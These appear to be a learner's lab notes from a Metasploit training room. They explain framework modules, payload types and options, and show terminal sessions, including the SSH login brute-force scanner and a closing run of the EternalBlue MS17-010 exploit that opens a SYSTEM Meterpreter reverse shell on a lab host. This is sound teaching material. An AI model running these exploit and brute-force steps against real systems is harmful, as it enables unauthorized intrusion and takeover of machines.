# Metasploit

The main components of the Metasploit Framework can be summarized as follows:

- **msfconsole**: The main command-line interface. - **Modules**: Building
  blocks such as exploits, auxiliary (scanners, crawlers, fuzzers), payloads,
  encoders, evasion, NOPs, and post modules. - **Tools**: Stand-alone utilities
  that assist with vulnerability research, assessment, and penetration testing
  (e.g., `msfvenom`, `pattern_create`, `pattern_offset`). *This module covers
  `msfvenom`; the pattern tools are helpful for exploit development.*

---

## Main Components of Metasploit

- **msfconsole**: The main command-line interface for interacting with
  Metasploit.

- **Modules**: - **Exploits**: Code that leverages vulnerabilities on target
  systems. - **Auxiliary**: Supporting modules such as scanners, crawlers, and
  fuzzers. - **Payloads**: Code executed on the target after exploitation (e.g.,
  reverse shell, command execution). - **Encoders**: Obfuscate payloads to evade
  signature-based detection. - **Evasion**: Modules designed to bypass security
  mechanisms. - **NOPs**: “No Operation” instructions used as buffers in
  payloads. - **Post**: Post-exploitation modules for actions after gaining
  access.

- **Tools**: Stand-alone utilities for tasks like payload generation and exploit
  development.   Examples: `msfvenom` (payload generation), `pattern_create`,
  `pattern_offset` (exploit development).

### Key Terms

- **Exploit**: Code that takes advantage of a vulnerability on the target. -
  **Vulnerability**: A flaw in design, code, or logic that can be exploited;
  exploitation may disclose data or allow code execution. - **Payload**: The
  code delivered by an exploit to achieve a goal (e.g., shell access, data
  exfiltration).

---

## Auxiliary

Supporting modules such as scanners, crawlers, and fuzzers.

## Encoders

Encoders will allow you to encode the exploit and payload in the hope that a
signature-based antivirus solution may miss them.

## Evasion

While encoders obfuscate content, they are not a direct attempt to evade
antivirus software. **Evasion** modules explicitly attempt to bypass security
controls (with varying success).

## Exploits

Exploits are organized by target system. Once all module parameters are set,
launch the module using the `exploit` command.

## NOPs

**NOPs (No Operation)** do nothing. On Intel x86 they are represented by `0x90`,
which consumes one CPU cycle with no effect. They’re often used as buffers to
achieve consistent payload sizes.

## Payloads

Payloads are the code that runs on the target system. Exploits leverage a
vulnerability, but payloads achieve the result (e.g., getting a shell, running a
command, loading a backdoor, launching `calc.exe` as a benign PoC).

### Types of Payloads

You will see four directories under **payloads**: **adapters**, **singles**,
**stagers**, and **stages**.

- **Adapters**: Wrap single payloads to convert them into different formats
  (e.g., a single payload wrapped in a PowerShell adapter to execute as one
  PowerShell command). - **Singles**: Self-contained payloads (add user, launch
  `notepad.exe`, etc.) that do not need to download additional components. -
  **Stagers**: Set up a communication channel between Metasploit and the target;
  used with staged payloads to keep the initial payload small. - **Stages**: The
  larger components downloaded by the stager (allowing richer functionality).

## Post

**Post** modules are useful in the post-exploitation stage of a penetration
test.

---

## Initial Setup

```bash
root@ip-10-10-63-107:~# msfupdate
Adding metasploit-framework to your repository list..File '/usr/share/keyrings/metasploit-framework.gpg' exists. Overwrite? (y/N) y
Updating package cache..W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: https://downloads.metasploit.com/data/releases/metasploit-framework/apt lucid InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY C048F0B49DEEC457
W: Failed to fetch http://downloads.metasploit.com/data/releases/metasploit-framework/apt/dists/lucid/InRelease  The following signatures couldn't be verified because the public key is not available: NO_PUBKEY C048F0B49DEEC457
W: Some index files failed to download. They have been ignored, or old ones used instead.
OK
Checking for and installing update..
Reading package lists... Done
Building dependency tree
Reading state information... Done
metasploit-framework is already the newest version (6.4.55~20250326102656~1rapid7-1).
The following packages were automatically installed and are no longer required:
  fonts-lato liblttng-ust-ctl4 liblttng-ust0 libwireshark13 libwiretap10
  libwsutil11 python3-wheel ruby-build ruby-minitest ruby-net-telnet
  ruby-power-assert ruby-test-unit ruby-xmlrpc ruby-zip ruby2.7-doc
  rubygems-integration
Use 'apt autoremove' to remove them.
0 to upgrade, 0 to newly install, 0 to remove and 257 not to upgrade.
root@ip-10-10-63-107:~# msfconsole
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
Metasploit tip: Use sessions -1 to interact with the last opened session
```

```text
 ______________________________________
/ it looks like you're trying to run a \ module                               /
 --------------------------------------

        __
    /      |  |
    @  @
    |  |
    || |/
    || ||
    |\_/|
    \___/

       =[ metasploit v6.4.55-dev-                         ]
- -- --=[ 2502 exploits - 1287 auxiliary - 431 post       ]
- -- --=[ 1616 payloads - 49 encoders - 13 nops           ]
- -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/
```

```bash
msf6 > ls
[*] exec: ls
burp.json   Desktop    Instructions  Postman  Scripts  thinclient_drives
CTFBuilder  Downloads  Pictures      Rooms    snap     Tools

msf6 > ping -c 1 8.8.8.8
[*] exec: ping -c 1 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=0.806 ms
--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.806/0.806/0.806/0.000 ms

msf6 > history
# (history output truncated for brevity)
```

---

## Exploitations

```text
# (Large module listing preserved as provided)
   4296    \_ target: xterm (Generic)
   4297    \_ target: gnome-terminal (Ubuntu)
   4298  exploit/windows/browser/x360_video_player_set_text_bof                   2015-01-30  normal     No   X360 VideoPlayer ActiveX Control Buffer Overflow
   4299  exploit/multi/http/x7chat2_php_exec                                      2014-10-27  excellent  Yes  X7 Chat 2.0.5 lib/message.php preg_replace() PHP Code Execution
   4300  exploit/windows/http/xampp_webdav_upload_php                             2012-01-14  excellent  No   XAMPP WebDAV PHP Upload
   ...
   4517  exploit/unix/http/xdebug_unauth_exec                                     2017-09-17  excellent  Yes  xdebug Unauthenticated OS Command Execution
```

Interact with a module by name or index. For example: `info 4517`, `use 4517`,
or `use exploit/unix/http/xdebug_unauth_exec`.

```bash
msf6 > search type:auxiliary ssh_login

Matching Modules
================
0  auxiliary/scanner/ssh/ssh_login         .  normal  No  SSH Login Check Scanner
1  auxiliary/scanner/ssh/ssh_login_pubkey  .  normal  No  SSH Public Key Login Scanner

msf6 > info 0
```

```text
Name: SSH Login Check Scanner
Module: auxiliary/scanner/ssh/ssh_login
License: Metasploit Framework License (BSD)
Rank: Normal
Provided by: todb <todb@metasploit.com>
Check supported: No

Basic options:
  ANONYMOUS_LOGIN   false  (Attempt blank username/password)
  BLANK_PASSWORDS   false
  BRUTEFORCE_SPEED  5
  CreateSession     true
  DB_ALL_CREDS      false
  DB_ALL_PASS       false
  DB_ALL_USERS      false
  DB_SKIP_EXISTING  none   (Accepted: none, user, user&realm)
  PASSWORD
  PASS_FILE
  RHOSTS            (required) The target host(s)
  RPORT             22
  STOP_ON_SUCCESS   false
  THREADS           1
  USERNAME
  USERPASS_FILE
  USER_AS_PASS      false
  USER_FILE
  VERBOSE           false

Description:
  Tests SSH logins on a range of machines and reports successful logins.
References:
  https://nvd.nist.gov/vuln/detail/CVE-1999-0502
```

---

## Options

Parameters you will often use are:

- **RHOSTS**: “Remote hosts” — target IP(s). Supports single IP, CIDR (e.g.,
  `/24`), ranges (e.g., `10.10.10.x–10.10.10.y`), or a file:
  `file:/path/to/targets.txt` (one per line). - **RPORT**: “Remote port” —
  service port on the target. - **PAYLOAD**: Payload to use with the exploit. -
  **LHOST**: “Local host” — your attacking machine’s IP (e.g., AttackBox/Kali).
  - **LPORT**: “Local port” — the port for the reverse shell to connect back to.
  - **SESSION**: Each connection has a session ID, used by post-exploitation
  modules.

## Unset

Override any parameter with `set <name> <value>`. Clear a parameter with `unset
<name>` or clear all with `unset all`.

## setg

Use `setg` to set values that apply to all modules (same syntax as `set`).

---

## Full Rundown

```bash
root@ip-10-10-63-107:~# msfconsole
Metasploit tip: To save all commands executed since start up to a file, use the makerc command
```

```text
       =[ metasploit v6.4.55-dev-                         ]
+ -- --=[ 2502 exploits - 1287 auxiliary - 431 post       ]
+ -- --=[ 1616 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/
```

```bash
msf6 > setg rhosts 10.10.212.229
rhosts => 10.10.212.229
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z
# ... (unsuccessful attempts omitted)
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg rhosts 10.10.226.222
rhosts => 10.10.226.222
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z
[+] 10.10.226.222:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
# ... (grooming, trigger, stage)
[*] Meterpreter session 1 opened (10.10.63.107:4444 -> 10.10.226.222:49176)
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions

Active sessions
===============
Id  Type                  Information                 Connection
--  --------------------  --------------------------  --------------------------
1   meterpreter x64/win   NT AUTHORITY\SYSTEM @ JON-PC  10.10.63.107:4444 -> 10.10.226.222:49176

msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1
[*] Starting interaction with 1...
meterpreter >
```
